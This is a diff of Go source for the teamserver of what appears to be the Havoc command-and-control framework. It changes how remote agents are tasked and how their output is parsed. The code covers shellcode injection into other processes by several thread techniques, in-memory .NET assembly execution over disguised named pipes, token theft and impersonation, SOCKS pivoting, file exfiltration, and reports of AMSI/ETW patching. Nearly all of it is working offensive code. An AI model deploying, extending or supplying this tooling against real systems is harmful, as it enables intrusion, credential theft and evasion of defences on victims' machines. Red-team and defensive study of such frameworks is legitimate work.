@@ -3,15 +3,15 @@ package agent
 import (
 	"bytes"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
-	"os"
 	"math/rand"
 	"net"
-	"encoding/binary"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -46,8 +46,8 @@ func (a *Agent) UploadMemFileInChunks(FileData []byte) uint32 {
 		}
 
 		MemFileJob := Job{
+			Command:   COMMAND_MEM_FILE,
 			RequestID: rand.Uint32(),
-			Command: COMMAND_MEM_FILE,
 			Data: []any{
 				ID,
 				uint64(FileSize),
@@ -125,11 +125,11 @@ func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID strin
 	return nil
 }
 
-func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, ClientID string) (*Job, error) {
+func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, ClientID string, teamserver TeamServer) (*Job, error) {
 	var (
 		job = &Job{
-			RequestID: rand.Uint32(),
 			Command:   uint32(Command),
+			RequestID: rand.Uint32(),
 			Data:      []interface{}{},
 			Created:   time.Now().UTC().Format("02/01/2006 15:04:05"),
 		}
@@ -556,6 +556,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			var bofcallback = &BofCallback{
 				TaskID:   job.RequestID,
 				Output:   "",
+				Error:    "",
 				ClientID: ClientID,
 			}
 
@@ -615,35 +616,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 		break
 
-	// TODO: make it more malleable/random values
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
-		rand.Seed(time.Now().UnixNano())
-		const pipePrefix = "\\\\.\\pipe\\mojo."
-		const (
-			runeALen = 4
-			runeBLen = 4
-			runeCLen = 12
-			runeDLen = 7
-		)
-
-		generateRuneString := func(length int) string {
-			pipeRunes := []rune("0123456789")
-			runes := make([]rune, length)
-			for i := range runes {
-				runes[i] = pipeRunes[rand.Intn(len(pipeRunes))]
-			}
-			return string(runes)
-		}
-
-		finalPipe := pipePrefix + generateRuneString(runeALen) + "." + generateRuneString(runeBLen) + "." + generateRuneString(runeCLen) + generateRuneString(runeDLen)
-
 		var (
 			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 			arguments        = common.EncodeUTF16(Optional["Arguments"].(string))
 			NetVersion       = common.EncodeUTF16("v4.0.30319")
-			PipePath         = common.EncodeUTF16(finalPipe)
+			PipePath         = common.EncodeUTF16(common.GeneratePipeName(teamserver.GetDotNetPipeTemplate(), a.Info.ProcessPID, a.Info.ProcessTID))
 			AppDomainName    = common.EncodeUTF16("DefaultDomain")
-			MemFileId uint32
+			MemFileId        uint32
 		)
 
 		MemFileId = a.UploadMemFileInChunks(binaryDecoded)
@@ -758,14 +738,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 	case COMMAND_INJECT_SHELLCODE:
 
 		var (
-			TargetArch int
-			Argument   []byte
+			x64       int
+			Technique int
+			Argument  []byte
 		)
 
 		if val, ok := Optional["Way"]; ok {
 
 			if val.(string) == "Inject" {
-				Inject := 1
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -787,27 +767,41 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					return job, err
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
+				x64 = win32.FALSE
 				if Optional["Arch"] == "x64" {
-					TargetArch = 2
-				} else {
-					TargetArch = 1
+					x64 = win32.TRUE
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_INJECT,
 					Technique,
-					TargetArch,
+					x64,
 					Binary,
 					Argument,
 					TargetPid,
 				}
 			} else if val.(string) == "Spawn" {
-				Inject := 0
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -824,26 +818,40 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					}
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
+				x64 = win32.FALSE
 				if Optional["Arch"] == "x64" {
-					TargetArch = 2
-				} else {
-					TargetArch = 1
+					x64 = win32.TRUE
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_SPAWN,
 					Technique,
-					TargetArch,
+					x64,
 					Binary,
 					Argument,
 				}
 			} else if val.(string) == "Execute" {
-				Inject := 2
 				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 				if err != nil {
 					return job, err
@@ -860,21 +868,36 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					}
 				}
 
-				Technique, err := strconv.Atoi(Optional["Technique"].(string))
-				if err != nil {
-					return job, err
+				switch strings.ToLower(Optional["Technique"].(string)) {
+				case "default":
+					Technique = THREAD_METHOD_DEFAULT
+					break
+
+				case "createremotethread":
+					Technique = THREAD_METHOD_CREATEREMOTETHREAD
+					break
+
+				case "ntcreatethreadex":
+					Technique = THREAD_METHOD_NTCREATEHREADEX
+					break
+
+				case "ntqueueapcthread":
+					Technique = THREAD_METHOD_NTQUEUEAPCTHREAD
+					break
+
+				default:
+					return job, fmt.Errorf("technique \"%v\"", Optional["Technique"].(string))
 				}
 
+				x64 = win32.FALSE
 				if Optional["Arch"] == "x64" {
-					TargetArch = 2
-				} else {
-					TargetArch = 1
+					x64 = win32.TRUE
 				}
 
 				job.Data = []interface{}{
-					Inject,
+					INJECT_WAY_EXECUTE,
 					Technique,
-					TargetArch,
+					x64,
 					Binary,
 					Argument,
 				}
@@ -922,8 +945,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 				if val, ok := Optional["Arguments"].(string); ok {
 
 					var (
-						PID int
-						Handle int64
+						PID       int
+						Handle    int64
 						ArrayData []string
 					)
 
@@ -974,11 +997,11 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 				if PrivName, ok := Optional["Arguments"].(string); ok {
 
-				job.Data = []interface{}{
-					SubCommand,
-					win32.FALSE,
-					PrivName,
-				}
+					job.Data = []interface{}{
+						SubCommand,
+						win32.FALSE,
+						PrivName,
+					}
 
 				} else {
 					return job, errors.New("token arguments not found")
@@ -1080,7 +1103,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 				break
 
-			case "find-tokens":
+			case "find":
 				SubCommand = 0xa
 
 				job.Data = []interface{}{
@@ -1243,6 +1266,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 					if KillDate < time.Now().Unix() {
 						return nil, errors.New("The date can't be in the past")
 					}
+					KillDate = common.EpochTimeToSystemTime(KillDate)
 				}
 			} else {
 				KillDate = 0
@@ -1608,7 +1632,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			if Param == "" {
 				return nil, fmt.Errorf("socks add requieres a port")
 			}
-	
+
 			var Socks *socks.Socks
 
 			Socks = socks.NewSocks("0.0.0.0:" + Param)
@@ -1619,11 +1643,11 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {
 
 				var (
-					ConnectJob  Job
+					ConnectJob        Job
 					NegotiationHeader socks.NegotiationHeader
-					SocksHeader socks.SocksHeader
-					err         error
-					SocketId    int32
+					SocksHeader       socks.SocksHeader
+					err               error
+					SocketId          int32
 				)
 
 				// parse all the methods supported by the client
@@ -1676,18 +1700,18 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 				// NOTE: if you don't want to support IPv6, uncomment this:
 				/*
-				if SocksHeader.ATYP == socks.IPv6 {
-					err = socks.SendAddressTypeNotSupported(conn)
-					if err != nil {
-						logger.Error("Failed to send response to socks client: " + err.Error())
+					if SocksHeader.ATYP == socks.IPv6 {
+						err = socks.SendAddressTypeNotSupported(conn)
+						if err != nil {
+							logger.Error("Failed to send response to socks client: " + err.Error())
+							return
+						}
 						return
 					}
-					return
-				}
 				*/
 
 				/* generate some random socket id */
-				SocketId = rand.Int31n(0x10000)
+				SocketId = int32(rand.Uint32())
 
 				s.Clients = append(s.Clients, SocketId)
 
@@ -1720,7 +1744,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 								continue
 							}
 
-							if Data, err := a.SocksClientRead(SocketId); err == nil {
+							if Data, err := a.SocksClientRead(client); err == nil {
 
 								/* only send the data if there is something... */
 								if len(Data) > 0 {
@@ -1729,7 +1753,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 									var job = Job{
 										Command: COMMAND_SOCKET,
 										Data: []any{
-											SOCKET_COMMAND_READ_WRITE,
+											SOCKET_COMMAND_WRITE,
 											client.SocketID,
 											Data,
 										},
@@ -1745,7 +1769,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 								if err != io.EOF {
 
 									/* we failed to read from the socks proxy */
-									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", client.SocketID, err))
+									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", SocketId, err))
 
 									a.SocksClientClose(int32(SocketId))
 
@@ -1754,7 +1778,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 										Command: COMMAND_SOCKET,
 										Data: []any{
 											SOCKET_COMMAND_CLOSE,
-											client.SocketID,
+											int32(SocketId),
 										},
 									}
 
@@ -1779,10 +1803,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			})
 
 			/* TODO: append the socket to a list/array now */
+			a.SocksSvrMtx.Lock()
+
 			a.SocksSvr = append(a.SocksSvr, &SocksServer{
 				Server: Socks,
 				Addr:   Param,
 			})
+
+			a.SocksSvrMtx.Unlock()
 
 			go func() {
 				err := Socks.Start()
@@ -1820,11 +1848,15 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			Output += fmt.Sprintf(" Port \n")
 			Output += fmt.Sprintf(" ---- \n")
 
+			a.SocksSvrMtx.Lock()
+
 			for _, server := range a.SocksSvr {
 
 				Output += fmt.Sprintf(" %s \n", server.Addr)
 
 			}
+
+			a.SocksSvrMtx.Unlock()
 
 			if Message != nil {
 				*Message = map[string]string{
@@ -1840,6 +1872,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
 			var found = false
+
+			a.SocksSvrMtx.Lock()
 
 			for i := range a.SocksSvr {
 
@@ -1879,6 +1913,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 			}
 
+			a.SocksSvrMtx.Unlock()
+
 			if found {
 
 				if Message != nil {
@@ -1904,6 +1940,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 		case "socks clear":
 
 			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
+
+			a.SocksSvrMtx.Lock()
 
 			for i := range a.SocksSvr {
 
@@ -1934,6 +1972,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 				a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)
 
 			}
+
+			a.SocksSvrMtx.Unlock()
 
 			if Message != nil {
 				*Message = map[string]string{
@@ -2087,16 +2127,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 	AgentID := int(NameID)
 
 	/* if the RequestID was not generated by the TS, reject the request */
-	if a.IsKnownRequestID(RequestID, CommandID) == false {
+	if a.IsKnownRequestID(teamserver, RequestID, CommandID) == false {
 		logger.Warn(fmt.Sprintf("Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity", AgentID, CommandID, RequestID))
 		return
 	}
 
-	Parser.DecryptBuffer(a.Encryption.AESKey, a.Encryption.AESIv)
-
-	//logger.Debug("Task Output: \n" + hex.Dump(Parser.Buffer()))
-
-	a.UpdateLastCallback(teamserver)
 
 	switch CommandID {
 
@@ -2108,8 +2143,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 	case COMMAND_EXIT:
 		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				ExitMethod  = Parser.ParseInt32()
-				Message = make(map[string]string)
+				ExitMethod = Parser.ParseInt32()
+				Message    = make(map[string]string)
 			)
 
 			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_EXIT, ExitMethod: %d", AgentID, ExitMethod))
@@ -2156,7 +2191,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		Message["Type"] = "Info"
 		Message["Message"] = "Received checkin request"
 
-		if Parser.Length() >= 32 + 16 {
+		if Parser.Length() >= 32+16 {
 			var (
 				DemonID      int
 				Hostname     string
@@ -2165,9 +2200,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				InternalIP   string
 				ProcessName  string
 				ProcessPID   int
+				ProcessTID   int
 				OsVersion    []int
 				OsArch       int
 				Elevated     int
+				BaseAddress  int64
 				ProcessArch  int
 				ProcessPPID  int
 				SleepDelay   int
@@ -2185,30 +2222,32 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				Username = Parser.ParseString()
 				DomainName = Parser.ParseString()
 				InternalIP = Parser.ParseString()
-				ProcessName = Parser.ParseString()
+				ProcessName = Parser.ParseUTF16String()
 				ProcessPID = Parser.ParseInt32()
+				ProcessTID = Parser.ParseInt32()
 				ProcessPPID = Parser.ParseInt32()
 				ProcessArch = Parser.ParseInt32()
 				Elevated = Parser.ParseInt32()
+				BaseAddress = Parser.ParseInt64()
 				OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
 				OsArch = Parser.ParseInt32()
-				SleepDelay  = Parser.ParseInt32()
+				SleepDelay = Parser.ParseInt32()
 				SleepJitter = Parser.ParseInt32()
 				KillDate = Parser.ParseInt64()
 				WorkingHours = int32(Parser.ParseInt32())
 
 				a.Active = true
 
-				a.NameID            = fmt.Sprintf("%x", DemonID)
-				a.Info.FirstCallIn  = a.Info.FirstCallIn
-				a.Info.LastCallIn   = a.Info.LastCallIn
-				a.Info.Hostname     = Hostname
-				a.Info.DomainName   = DomainName
-				a.Info.Username     = Username
-				a.Info.InternalIP   = InternalIP
-				a.Info.SleepDelay   = SleepDelay
-				a.Info.SleepJitter  = SleepJitter
-				a.Info.KillDate     = KillDate
+				a.NameID = fmt.Sprintf("%08x", DemonID)
+				a.Info.FirstCallIn = a.Info.FirstCallIn
+				a.Info.LastCallIn = a.Info.LastCallIn
+				a.Info.Hostname = Hostname
+				a.Info.DomainName = DomainName
+				a.Info.Username = Username
+				a.Info.InternalIP = InternalIP
+				a.Info.SleepDelay = SleepDelay
+				a.Info.SleepJitter = SleepJitter
+				a.Info.KillDate = KillDate
 				a.Info.WorkingHours = WorkingHours
 
 				// a.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
@@ -2263,9 +2302,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				process := strings.Split(ProcessName, "\\")
 
 				a.Info.ProcessName = process[len(process)-1]
-				a.Info.ProcessPID = ProcessPID
+				a.Info.ProcessPID  = ProcessPID
+				a.Info.ProcessTID  = ProcessTID
 				a.Info.ProcessPPID = ProcessPPID
 				a.Info.ProcessPath = ProcessName
+				a.Info.BaseAddress = BaseAddress
 
 				a.SessionDir = logr.LogrInstance.AgentPath + "/" + a.NameID
 
@@ -2294,9 +2335,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						"  - Process Name       : %v\n"+
 						"  - Process Arch       : %v\n"+
 						"  - Process ID         : %v\n"+
+						"  - Thread ID          : %v\n"+
 						//"  - Process Parent ID  : %v\n" +
 						"  - Process Path       : %v\n"+
 						"  - Process Elevated   : %v\n"+
+						"  - Base Address       : 0x%x\n"+
 						"\n"+
 						"Operating System:\n"+
 						"  - Version            : %v\n"+
@@ -2327,9 +2370,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					a.Info.ProcessName,
 					a.Info.ProcessArch,
 					a.Info.ProcessPID,
+					a.Info.ProcessTID,
 					//a.Info.ProcessPPID,
 					a.Info.ProcessPath,
 					a.Info.Elevated,
+					a.Info.BaseAddress,
 
 					// Operating System Info
 					a.Info.OSVersion,
@@ -2395,7 +2440,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						MemFunction = Parser.ParsePointer()
 						ThreadId    = Parser.ParseInt32()
 					)
-					
+
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_EXEC, MemFunction: %x, ThreadId: %d", AgentID, MemFunction, ThreadId))
 
 					Output["Message"] = fmt.Sprintf("Memory Executed  : Function:[0x%x] ThreadId:[%d]", MemFunction, ThreadId)
@@ -2453,7 +2498,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 			var Output = make(map[string]string)
 
-			a.Info.SleepDelay  = Parser.ParseInt32()
+			a.Info.SleepDelay = Parser.ParseInt32()
 			a.Info.SleepJitter = Parser.ParseInt32()
 			teamserver.AgentUpdate(a)
 
@@ -2755,11 +2800,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					case 0x0:
 						logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))
 
-						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+						if Parser.CanIRead([]parser.ReadType{parser.ReadInt64, parser.ReadBytes}) {
 							var (
-								FileSize = Parser.ParseInt32()
+								FileSize = Parser.ParseInt64()
 								FileName = Parser.ParseUTF16String()
-								Size     = common.ByteCountSI(int64(FileSize))
+								Size     = common.ByteCountSI(FileSize)
 							)
 
 							Output["Type"] = "Info"
@@ -3026,7 +3071,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 			Process.PPID = strconv.Itoa(Parser.ParseInt32())
 			Process.Session = strconv.Itoa(Parser.ParseInt32())
 			Process.Threads = strconv.Itoa(Parser.ParseInt32())
-			Process.User = Parser.ParseString()
+			Process.User = Parser.ParseUTF16String()
 
 			var ProcessArch = "x64"
 			if Process.IsWow == win32.TRUE {
@@ -3165,7 +3210,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					for _, BofCallback := range a.BofCallbacks {
 						if BofCallback.TaskID == RequestID {
 							// store the output and later send it back to the python module
-							BofCallback.Output += Parser.ParseString()
+							BofCallback.Error += Parser.ParseString()
 							found = true
 							break
 						}
@@ -3192,9 +3237,9 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					var Data = Parser.ParseBytes()
 					if len(Data) > 8 {
 						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE", AgentID))
-						var FileID     = int(binary.BigEndian.Uint32(Data[0:4]))
-						var FileLength = int(binary.BigEndian.Uint32(Data[4:8]))
-						var FileName   = string(Data[8:])
+						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))
+						var FileLength = int64(binary.BigEndian.Uint32(Data[4:8]))
+						var FileName = string(Data[8:])
 
 						var Output = make(map[string]string)
 						Output["Type"] = "Info"
@@ -3224,8 +3269,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					if len(Data) >= 4 {
 						logger.Debug(fmt.Sprintf("Agent: %x, Command: BEACON_OUTPUT - CALLBACK_FILE_WRITE", AgentID))
 
-						var FileID     = int(binary.BigEndian.Uint32(Data[0:4]))
-						var FileChunk  = Data[4:]
+						var FileID = int(binary.BigEndian.Uint32(Data[0:4]))
+						var FileChunk = Data[4:]
 
 						var err = a.DownloadWrite(FileID, FileChunk)
 						if err != nil {
@@ -3349,10 +3394,19 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_INJECT_SHELLCODE, Status: %d", AgentID, Status))
 
-			if Status == win32.TRUE {
+			if Status == INJECT_ERROR_SUCCESS {
 				Message["Type"] = "Good"
 				Message["Message"] = "Successful injected shellcode"
-			} else {
+			} else if Status == INJECT_ERROR_FAILED {
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to inject shellcode"
+			} else if Status == INJECT_ERROR_INVALID_PARAM {
+				Message["Type"] = "Error"
+				Message["Message"] = "Invalid parameter specified"
+			} else if Status == INJECT_ERROR_PROCESS_ARCH_MISMATCH {
+				Message["Type"] = "Error"
+				Message["Message"] = "Process architecture mismatch"
+			} else if Status == INJECT_ERROR_FAILED {
 				Message["Type"] = "Error"
 				Message["Message"] = "Failed to inject shellcode"
 			}
@@ -3721,6 +3775,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					// send the output back to the python module
 					OutputMap["Worked"] = "true"
 					OutputMap["Output"] = BofCallback.Output
+					OutputMap["Error"] = BofCallback.Error
 					OutputMap["TaskID"] = strings.ToUpper(fmt.Sprintf("%08x", RequestID))
 					teamserver.PythonModuleCallback(BofCallback.ClientID, a.NameID, HAVOC_BOF_CALLBACK, OutputMap)
 					a.BofCallbacks = append(a.BofCallbacks[:i], a.BofCallbacks[i+1:]...)
@@ -3839,33 +3894,10 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 			)
 
 			switch InfoID {
-			case DOTNET_INFO_AMSI_PATCHED:
+			case DOTNET_INFO_PATCHED:
 
-				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED", AgentID))
-
-					switch Parser.ParseInt32() {
-					case 0:
-						Message["Type"] = "Good"
-						Message["Message"] = "Successfully Patched Amsi"
-
-						break
-					case 1:
-						Message["Type"] = "Error"
-						Message["Message"] = "Failed to patch Amsi"
-
-						break
-					case 2:
-						Message["Type"] = "Info"
-						Message["Message"] = "Amsi already patched"
-
-						break
-					default:
-						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED, Invalid packet", AgentID))
-					}
-				} else {
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_ASSEMBLY_INLINE_EXECUTE - DOTNET_INFO_AMSI_PATCHED, Invalid packet", AgentID))
-				}
+				Message["Type"] = "Info"
+				Message["Message"] = "[HwBpEngine] Amsi/Etw has been hooked & patched"
 
 				break
 
@@ -3986,7 +4018,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						Successful = Parser.ParseInt32()
 						User       = Parser.ParseBytes()
 					)
-					
+
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_IMPERSONATE, Successful: %d, User: %s", AgentID, Successful, User))
 
 					if Successful == win32.TRUE {
@@ -4007,7 +4039,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
 					var (
-						User      = Parser.ParseString()
+						User      = Parser.ParseUTF16String()
 						TokenID   = Parser.ParseInt32()
 						TargetPID = Parser.ParseInt32()
 					)
@@ -4037,7 +4069,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					var (
 						TokenIndex    = Parser.ParseInt32()
 						Handle        = fmt.Sprintf("0x%x", Parser.ParseInt32())
-						DomainAndUser = Parser.ParseString()
+						DomainAndUser = Parser.ParseUTF16String()
 						ProcessID     = Parser.ParseInt32()
 						Type          = Parser.ParseInt32()
 						Impersonating = Parser.ParseInt32()
@@ -4052,28 +4084,32 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 				FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-14v %%-4v\n", MaxString)
 
-				Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type","Impersonating")
-				Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "--------------","-------------")
+				if len(Array) > 0 {
+					Buffer += fmt.Sprintf(FmtString, " ID ", "Handle", "Domain\\User", "PID", "Type", "Impersonating")
+					Buffer += fmt.Sprintf(FmtString, "----", "------", "-----------", "---", "--------------", "-------------")
 
-				for _, item := range Array {
+					for _, item := range Array {
 
-					if item[4] == 0x1 {
-						item[4] = "stolen"
-					} else if item[4] == 0x2 {
-						item[4] = "make (local)"
-					} else if item[4] == 0x3 {
-						item[4] = "make (network)"
-					} else {
-						item[4] = "unknown"
+						if item[4] == 0x1 {
+							item[4] = "stolen"
+						} else if item[4] == 0x2 {
+							item[4] = "make (local)"
+						} else if item[4] == 0x3 {
+							item[4] = "make (network)"
+						} else {
+							item[4] = "unknown"
+						}
+
+						if item[5] == win32.TRUE {
+							item[5] = "Yes"
+						} else {
+							item[5] = "No"
+						}
+
+						Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5])
 					}
-
-					if item[5] == win32.TRUE {
-						item[5] = "Yes"
-					} else {
-						item[5] = "No"
-					}
-
-					Buffer += fmt.Sprintf(FmtString, item[0], item[1], item[2], item[3], item[4], item[5])
+				} else {
+					Buffer = "The token vault is empty"
 				}
 
 				Output["Type"] = "Info"
@@ -4177,9 +4213,10 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 			case DEMON_COMMAND_TOKEN_GET_UID:
 
 				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+
 					var (
 						Elevated = Parser.ParseInt32()
-						User     = Parser.ParseString()
+						User     = Parser.ParseUTF16String()
 					)
 
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_GET_UID, Elevated: %d, User: %v", AgentID, Elevated, User))
@@ -4245,81 +4282,118 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 			case DEMON_COMMAND_TOKEN_FIND_TOKENS:
 
 				var (
-					Successful    int
-					Buffer        string
-					DomainAndUser string
-					NumDelTokens  int
-					NumImpTokens  int
-					ProcessPID    int
-					localHandle   int
+					Successful          int
+					Buffer              string
+					DomainAndUser       string
+					NumTokens           int
+					ProcessPID          int
+					localHandle         int
+					integrity_level     int
+					integrity           string
+					impersonation_level int
+					impersonation       string
+					TokenType           int
+					Type                string
+					Array               [][]any
+					MaxString           int
+					RemoteAuth          string
+					FmtString           string
+					FoundTokens         bool
 				)
 
 				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
 					Successful = Parser.ParseInt32()
 
+					MaxString = 0
+
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Successful: %d", AgentID, Successful))
 
-					if Successful  == win32.TRUE {
-
-						Buffer += "Delegation Tokens Available\n"
-						Buffer += "========================================\n"
+					if Successful == win32.TRUE {
 
 						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
-							NumDelTokens = Parser.ParseInt32()
+							NumTokens = Parser.ParseInt32()
+							FoundTokens = NumTokens > 0
 
-							if NumDelTokens == 0 {
-								Buffer += "(No tokens found)\n"
-							} else {
-								for NumDelTokens > 0 && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
-									DomainAndUser = Parser.ParseString()
-									ProcessPID    = Parser.ParseInt32()
-									localHandle   = Parser.ParseInt32()
-									if localHandle != 0 {
-										Buffer += fmt.Sprintf("- User: %s, Process: %d, handle: %x\n", DomainAndUser, ProcessPID, localHandle )
-									} else {
-										Buffer += fmt.Sprintf("- User: %s, Process: %d\n", DomainAndUser, ProcessPID )
-									}
-									NumDelTokens--
